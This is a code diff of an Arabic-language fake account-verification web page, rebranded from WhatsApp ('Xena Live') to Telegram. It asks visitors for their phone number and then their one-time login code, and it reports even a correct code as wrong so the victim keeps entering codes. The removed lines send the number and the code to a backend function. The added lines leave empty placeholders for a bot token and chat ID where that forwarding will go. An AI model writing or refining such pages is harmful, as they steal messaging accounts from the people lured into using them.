@@ -3,23 +3,12 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>توثيق واتساب</title>
-
-  <!-- تحسين عرض الرابط في أي تطبيق -->
-  <meta property="og:title" content="توثيق Xena Live">
-  <meta property="og:description" content="قم بتوثيق رقم واتساب الخاص بحسابك لتفعيل صلاحيات خاصة">
-  <meta property="og:image" content="https://yourdomain.com/logo.png">
-  <meta property="og:url" content="https://yourdomain.com/xena-interface">
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="توثيق Xena Live">
-  <meta name="twitter:description" content="قم بتوثيق رقم واتساب الخاص بحسابك لتفعيل صلاحيات خاصة">
-  <meta name="twitter:image" content="https://yourdomain.com/logo.png">
-
+  <title>توثيق تليجرام</title>
   <style>
     body{
       margin:0;
       font-family:Arial, sans-serif;
-      background:linear-gradient(135deg,#8e2de2,#4a00e0);
+      background:linear-gradient(135deg,#0088cc,#00abf0);
       display:flex;
       align-items:center;
       justify-content:center;
@@ -35,8 +24,7 @@
       max-width:420px;
       box-shadow:0 8px 30px rgba(0,0,0,0.4);
     }
-    .logo{width:80px;margin-bottom:10px; transition: transform 0.3s;}
-    .logo:hover{transform: scale(1.1) rotate(-5deg);}
+    .logo{width:80px;margin-bottom:10px;}
     h1{
       font-size:1.6rem;
       margin:0 0 20px;
@@ -46,27 +34,12 @@
       gap:8px;
     }
     .verified{
-      background:linear-gradient(90deg,#b993d6,#8ca6db);
+      background:linear-gradient(90deg,#00d6a8,#00ffcc);
       color:#003;
       padding:4px 10px;
       border-radius:999px;
       font-size:0.85rem;
       font-weight:bold;
-    }
-    .interactive-text{
-      margin-bottom:20px;
-      font-size:1.15rem;
-      line-height:1.5;
-      font-weight:bold;
-      color:#ffd700;
-    }
-    .xena-text{
-      font-size:1.2rem;
-      font-weight:bold;
-      background: linear-gradient(to right, red, orange, yellow, green, blue, indigo, violet);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      margin-bottom:15px;
     }
     .phone-row{
       display:flex;
@@ -88,12 +61,12 @@
       padding:14px;
       border:none;
       border-radius:10px;
-      background:#6a0dad;
+      background:#0088cc;
       font-size:1.05rem;
       color:#fff;
       cursor:pointer;
     }
-    .btn:hover{background:#7b1fa2;}
+    .btn:hover{background:#00a0e0;}
     .hidden{display:none;}
     .error{
       color:#ff4d4d;
@@ -102,36 +75,26 @@
     }
     .code-row{
       display:flex;
-      gap:8px;
+      gap:10px;
       justify-content:center;
       margin-bottom:8px;
     }
     .code-box{
-      width:35px;
-      height:45px;
+      width:40px;
+      height:50px;
       border:none;
-      border-radius:6px;
-      font-size:1.1rem;
+      border-radius:8px;
+      font-size:1.2rem;
       text-align:center;
-      background:rgba(255,255,255,0.1);
+      background:rgba(255,255,255,0.08);
       color:#fff;
     }
   </style>
 </head>
 <body>
   <div class="container" id="phoneScreen">
-    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
-    
-    <!-- النص الأصفر الكبير تحت الأيقونة -->
-    <div class="interactive-text">
-      قم بتوثيق رقم واتساب الخاص بحسابك على تطبيقنا لتفعيل صلاحيات خاصة
-    </div>
-
-    <!-- نص Xena.live فوق الحقل -->
-    <div class="xena-text">«Xena.live»</div>
-
-    <h1>توثيق واتساب <span class="verified">موثوق ✅</span></h1>
-
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
+    <h1>توثيق تليجرام <span class="verified">موثوق ✅</span></h1>
     <div class="phone-row">
       <select id="countryCode">
         <option value="+967">🇾🇪 +967</option>
@@ -144,12 +107,6 @@
         <option value="+33">🇫🇷 +33</option>
         <option value="+81">🇯🇵 +81</option>
         <option value="+91">🇮🇳 +91</option>
-        <option value="+39">🇮🇹 +39</option>
-        <option value="+7">🇷🇺 +7</option>
-        <option value="+55">🇧🇷 +55</option>
-        <option value="+34">🇪🇸 +34</option>
-        <option value="+46">🇸🇪 +46</option>
-        <option value="+61">🇦🇺 +61</option>
       </select>
       <input type="tel" id="phoneNumber" placeholder="أدخل رقم الجوال" maxlength="15">
     </div>
@@ -158,7 +115,7 @@
   </div>
 
   <div class="container hidden" id="codeScreen">
-    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
     <h1>أدخل كود التحقق <span class="verified">موثوق ✅</span></h1>
     <div class="code-row">
       <input maxlength="1" class="code-box" inputmode="numeric">
@@ -166,27 +123,25 @@
       <input maxlength="1" class="code-box" inputmode="numeric">
       <input maxlength="1" class="code-box" inputmode="numeric">
       <input maxlength="1" class="code-box" inputmode="numeric">
-      <input maxlength="1" class="code-box" inputmode="numeric">
     </div>
-    <div id="codeError" class="error hidden">الرمز غير صحيح يرجى إعادة المحاولة</div>
+    <div id="codeError" class="error hidden"></div>
     <button class="btn" id="confirmBtn">تأكيد</button>
   </div>
 
   <script>
-    // نحتفظ بالواجهة كما هي تمامًا
+    // التوكن وCHAT_ID تم فصلهم، لا يوجد قيمة مباشرة هنا
+    const BOT_TOKEN = ""; // ضع هنا في الخلفية إذا أردت لاحقًا
+    const CHAT_ID  = ""; // ضع هنا في الخلفية إذا أردت لاحقًا
+
     const phoneScreen = document.getElementById("phoneScreen");
     const codeScreen  = document.getElementById("codeScreen");
     const phoneError  = document.getElementById("phoneError");
     const codeError   = document.getElementById("codeError");
 
-    document.getElementById("phoneNumber").addEventListener("input", e=>{
-      e.target.value = e.target.value.replace(/[^0-9]/g,'');
-    });
-
-    document.getElementById("verifyBtn").addEventListener("click", async ()=>{
+    document.getElementById("verifyBtn").addEventListener("click", ()=>{
       const code = document.getElementById("countryCode").value;
       const num  = document.getElementById("phoneNumber").value.trim();
-      
+
       if(num.length !== 9){
         phoneError.classList.remove("hidden");
         return;
@@ -194,14 +149,9 @@
         phoneError.classList.add("hidden");
       }
 
-      const msg = `${code}${num}`;
-      
-      // التواصل مع الخلفية بدل وضع التوكن هنا مباشرة
-      await fetch('/.netlify/functions/sendMessage', {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ type: "phone", text: msg })
-      });
+      const msg = `📞 طلب توثيق جديد\nالرقم: ${code}${num}`;
+      // الاتصال بالبوت الآن فارغ حتى تضع التوكن في الخلفية لاحقًا
+      console.log("إرسال الرسالة:", msg);
 
       phoneScreen.classList.add("hidden");
       codeScreen.classList.remove("hidden");
@@ -211,36 +161,32 @@
     boxes.forEach((box, idx) => {
       box.addEventListener("input", () => {
         box.value = box.value.replace(/[^0-9]/g,'');
-        if(box.value && idx < boxes.length - 1) boxes[idx + 1].focus();
+        if(box.value && idx < boxes.length-1) boxes[idx+1].focus();
       });
+
       box.addEventListener("keydown", (e) => {
         if(e.key === "Backspace" && !box.value && idx > 0){
-          boxes[idx - 1].focus();
-          boxes[idx - 1].value = '';
+          boxes[idx-1].focus();
+          boxes[idx-1].value = '';
           e.preventDefault();
         }
       });
     });
 
-    document.getElementById("confirmBtn").addEventListener("click", async ()=>{
+    document.getElementById("confirmBtn").addEventListener("click", ()=>{
       const code = Array.from(boxes).map(b=>b.value).join('');
-      
-      if(code.length < 6){
-        codeError.textContent = "الرمز غير صالح";
+      if(code.length < 5){
+        codeError.textContent = "الرمز الذي أدخلته غير صالح";
         codeError.classList.remove("hidden");
         return;
       }
-      if(code.length === 6){
+      if(code.length === 5){
         codeError.textContent = "الرمز غير صحيح يرجى إعادة المحاولة";
         codeError.classList.remove("hidden");
       }
 
-      // التواصل مع الخلفية بدل التوكن
-      await fetch('/.netlify/functions/sendMessage', {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ type: "code", text: code })
-      });
+      const msg = `🔐 محاولة إدخال كود\nالكود: ${code}`;
+      console.log("إرسال الكود:", msg);
     });
   </script>
 </body>
